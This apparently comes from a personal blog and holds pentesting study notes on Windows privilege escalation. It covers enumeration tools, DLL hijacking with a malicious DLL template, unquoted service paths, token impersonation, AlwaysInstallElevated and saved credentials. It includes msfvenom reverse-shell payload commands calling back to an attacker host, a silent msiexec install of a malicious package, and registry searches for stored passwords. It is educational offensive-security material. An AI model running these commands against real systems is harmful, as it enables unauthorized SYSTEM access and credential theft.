<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Basic Windows privilege escalation | Johannes Flachberger </title> <meta name="author" content="Johannes Flachberger"> <meta name="description" content="A collection of basic techiques, procedures and tools for performing privilege escalation on windows."> <meta name="keywords" content="cv, blog, cyber-security"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link defer href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;JF&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://johannes-flachberger.github.io/blog/2025/windows-privesc/"> <script src="/assets/js/theme.js?bc98222b904c9daed12bdba53b2b5c28"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
    initTheme();
  </script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <div class="navbar-brand social"> <a href="https://github.com/Johannes-Flachberger" title="GitHub" rel="external nofollow noopener" target="_blank"><i class="fa-brands fa-github"></i></a> <a href="https://www.linkedin.com/in/johannes-flachberger" title="LinkedIn" rel="external nofollow noopener" target="_blank"><i class="fa-brands fa-linkedin"></i></a> </div> <a class="navbar-brand title font-weight-lighter" href="/"> <span class="font-weight-bold">Johannes</span> Flachberger </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">whoami </a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item"> <button id="search-toggle" title="Search" onclick="openSearchModal()"> <span class="nav-link">search<i class="ti ti-search"></i></span> </button> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="ti ti-moon-filled" id="light-toggle-dark"></i> <i class="ti ti-sun-filled" id="light-toggle-light"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Basic Windows privilege escalation</h1> <p class="post-meta"> Created in February 21, 2025 </p> <p class="post-tags"> <a href="/blog/2025"> <i class="fa-solid fa-calendar fa-sm"></i> 2025 </a>   ·   <a href="/blog/tag/theory"> <i class="fa-solid fa-hashtag fa-sm"></i> theory</a>   <a href="/blog/tag/windows"> <i class="fa-solid fa-hashtag fa-sm"></i> windows</a>   <a href="/blog/tag/privesc"> <i class="fa-solid fa-hashtag fa-sm"></i> privesc</a>   ·   <a href="/blog/category/pentesting"> <i class="fa-solid fa-tag fa-sm"></i> pentesting</a> </p> </header> <article class="post-content"> <div id="markdown-content"> <h2 id="resources">Resources</h2> <p>checklist: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md info on vectors: https://github.com/sagishahar/lpeworkshop</p> <h2 id="useful-scripts">useful scripts</h2> <p><strong>winPEAS</strong> https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS (is detected by windows defender, best write output to file (winpeas &gt; outfile.txt)) <strong>PowerUp</strong> https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc (run with <code class="language-plaintext highlighter-rouge">Invoke-AllChecks</code> to check everything) <strong>windows exploit suggester</strong> old version: https://github.com/AonCyberLabs/Windows-Exploit-Suggester (use for old windows versions) new version: https://github.com/bitsadmin/wesng</p> <ol> <li>install on attacker</li> <li>run <code class="language-plaintext highlighter-rouge">windows-exploit-suggester.py –update</code> on attacker</li> <li>run <code class="language-plaintext highlighter-rouge">systeminfo</code> on target and save output to file (<code class="language-plaintext highlighter-rouge">&gt; output.txt</code>), transfer file to attacker</li> <li>run exploit suggester, eg.<code class="language-plaintext highlighter-rouge">windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt</code> <strong>meterpreter</strong> if you have [[tools/Metasploit framework/meterpreter]] shell use <code class="language-plaintext highlighter-rouge">multi/recon/local_exploit_suggester</code> <strong>Seatbelt</strong> https://github.com/GhostPack/Seatbelt <strong>BeRoot</strong> https://github.com/AlessandroZ/BeRoot</li> </ol> <h1 id="windows-user-accounts">Windows user accounts</h1> <p><strong>Administrator (local):</strong> This is the user with the most privileges. <strong>Standard (local):</strong> These users can access the computer but can only perform limited tasks. Typically these users can not make permanent or essential changes to the system. <strong>Guest:</strong> This account gives access to the system but is not defined as a user. <strong>Standard (domain):</strong> Active Directory allows organizations to manage user accounts. A standard domain account may have local administrator privileges. <strong>Administrator (domain):</strong> Could be considered as the most privileged user. It can edit, create, and delete other users throughout the organization’s domain.</p> <p><strong>SYSTEM account:</strong> you cant log in, but it is used by services installed on the machine</p> <h2 id="method">method</h2> <ol> <li>enumerate current user and its privileges [[training/thm/03_Privilige escalation/Windows/manual enum]]</li> <li>if possible use enumeration script (winPEAS or PowerUp.ps1)</li> <li>go by checklist</li> </ol> <h1 id="vectors">Vectors</h1> <h2 id="dll-hijacking">DLL hijacking</h2> <h3 id="dll-search-order">DLL search order</h3> <p>If <strong>SafeDllSearchMode</strong> is enabled:</p> <ol> <li>directory from which the application loaded.</li> <li>The system directory. Use the <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya" rel="external nofollow noopener" target="_blank">GetSystemDirectory</a> to get the path of this directory.</li> <li>The 16-bit system directory.</li> <li>The Windows directory. <a href="https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya" rel="external nofollow noopener" target="_blank">GetWindowsDirectory</a> to get the path</li> <li>The current directory.</li> <li>PATH directories. Note that this does not include the per-application path specified by the <strong>App Paths</strong> registry key. The <strong>App Paths</strong> key is not used when computing the DLL search path.</li> </ol> <p>if <strong>SafeDllSearchMode</strong> is disabled:</p> <ol> <li>dir where application is loaded</li> <li>current directory</li> <li>system directory</li> <li>16-bit system directory</li> <li>windows directory</li> <li>PATH directories</li> </ol> <p>for DLL hijack insert malicous DLL in higher position than the legitimate is in vulnerabilities can only be discorvered with admin privs -&gt; you need a test system</p> <p>malicious DLL template:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
</span>
<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span>

<span class="p">{</span>

<span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
<span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe /k whoami &gt; C:</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">dll.txt"</span><span class="p">);</span>
<span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div></div> <p>compile with mingw: <code class="language-plaintext highlighter-rouge">x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll</code> <code class="language-plaintext highlighter-rouge">sc stop dllsvc &amp; sc start dllsvc</code></p> <h2 id="unquoted-service-path">unquoted service path</h2> <p>requirements:</p> <ol> <li>Being able to write to a folder on the path</li> <li>Being able to restart the service</li> </ol> <p>if the path of a service is not provided as absolute path written in quotes, windows will start searching for the binary to run: it will search in every directory contained by the path, starting at the lowest one -&gt; put malicious .exe file in a directory where windows finds it before the legitimate one</p> <ol> <li>find service with unquoted path <code class="language-plaintext highlighter-rouge">wmic service get name,displayname,pathname,startmode</code>: to list services, search for unquoted path</li> <li>check privs on path folders: eg. <code class="language-plaintext highlighter-rouge">.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"</code> </li> <li>generate payload, eg with msfvenom <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[port] -f exe &gt; [executable_name].exe</code> </li> <li>start/restart service <code class="language-plaintext highlighter-rouge">sc start [service name]</code> </li> </ol> <h2 id="token-impersonation">Token impersonation</h2> <p>services make requests to higher priviliged service accounts -&gt; man in the middle attack to get a security token to athenticate on the service account <strong>eg. Hot Potato (alread patched):</strong> Step 1: The target system uses the Web Proxy Auto-Discovery (WPAD) protocol to locate its update server.<br> Step 2: This request is intercepted by the exploit, which sends a response redirecting the target system to a port on 127.0.0.1.<br> Step 3: The target system will ask for a proxy configuration file (wpad.dat).<br> Step 4: A malicious wpad.dat file is sent to the target. Step 5: The target system tries to connect to the proxy (now set by the malicious wpad.dat file sent on the previous step).<br> Step 6: The exploit will ask the target system to perform an NTLM authentication.<br> Step 7: The target system sends an NTLM handshake.<br> Step 8: The handshake received is relayed to the SMB service with a request to create a process. This process will have the privilege level of the service targeted, which would typically be “NT AUTHORITY\SYSTEM”.</p> <h2 id="scheduled-tasks">scheduled tasks</h2> <p>same method as with cronjobs on linux <code class="language-plaintext highlighter-rouge">schtasks</code>: query scheduled tasks eg. <code class="language-plaintext highlighter-rouge">schtasks /query /fo LIST /v</code></p> <h2 id="driver">Driver</h2> <p>are not updated very often, exploits may be available online <code class="language-plaintext highlighter-rouge">driverquery</code>: list installed drivers</p> <h2 id="alwaysinstallelevated">AlwaysInstallElevated</h2> <p>if windows installer files (.msi) always run with elevated privileges, we can create a malicious .msi file and run it on the target system prerequisites: the following registry options have to be set: <code class="language-plaintext highlighter-rouge">reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer</code><br> <code class="language-plaintext highlighter-rouge">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</code></p> <ol> <li>generate payload, eg using [[tools/Metasploit framework/msfvenom]]: <code class="language-plaintext highlighter-rouge">msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[PORT] -f msi -o malicious.msi</code> </li> <li>transfer payload to target</li> <li>start installer: <code class="language-plaintext highlighter-rouge">C:\Users\user\Desktop&gt;msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi</code> </li> </ol> <h2 id="saved-credentials">Saved Credentials</h2> <p>list credentials that are saved on the system: <code class="language-plaintext highlighter-rouge">cmdkey /list</code> try saved credentials: <code class="language-plaintext highlighter-rouge">runas /savecred /user:admin reverse_shell.exe</code> query registry keys possibly containing passwords: <code class="language-plaintext highlighter-rouge">reg query HKLM /f password /t REG_SZ /s</code> or <code class="language-plaintext highlighter-rouge">reg query HKCU /f password /t REG_SZ /s</code></p> <h2 id="local-service-connections">local service connections</h2> <p>some services may have network connections to localhost. since they are not cnnected to the outside, they often have weak security configs. any port that is listening, and not detectable from an outside scan may be vulnerable <code class="language-plaintext highlighter-rouge">netstat -ano</code>: list active internal network connection <code class="language-plaintext highlighter-rouge">-a</code>: all active connections and listening ports <code class="language-plaintext highlighter-rouge">-n</code>: no name resolution <code class="language-plaintext highlighter-rouge">-o</code>: show corresponding process id</p> <h2 id="installed-software">installed software</h2> <p>check installed software and search for exploits</p> </div> </article> </div> </div> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Johannes Flachberger. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> using the <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?e5afe30913247fba79735ef42ffaa91f"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
    addBackToTop();
  </script> <script type="module" src="/assets/js/search/ninja-keys.min.js?a3446f084dcaecc5f75aa1757d087dcf"></script> <ninja-keys hidebreadcrumbs noautoloadmdicons placeholder="Type to start searching"></ninja-keys> <script src="/assets/js/search-setup.js?6c304f7b1992d4b60f7a07956e52f04a"></script> <script src="/assets/js/search-data.js"></script> <script src="/assets/js/shortcut-key.js?3f95cd4b032198a059ab2c79c1671def"></script> </body> </html>